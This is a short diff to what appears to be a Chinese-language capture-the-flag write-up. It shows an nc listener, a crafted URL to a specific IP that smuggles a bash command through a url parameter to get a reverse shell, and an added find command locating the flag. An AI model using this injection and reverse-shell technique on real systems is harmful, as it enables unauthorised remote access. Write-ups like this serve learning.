@@ -41,6 +41,8 @@ nc -lvp 7777
 尝试命令执行：
 http://117.50.3.97:8004/?url=file:bash%20a|&filename=dadsdasd
 这时服务器上就会有反弹到的shell
+find / -iname 'flag*'
+就可以找到flag再/tmp目录下
 ```
 
 
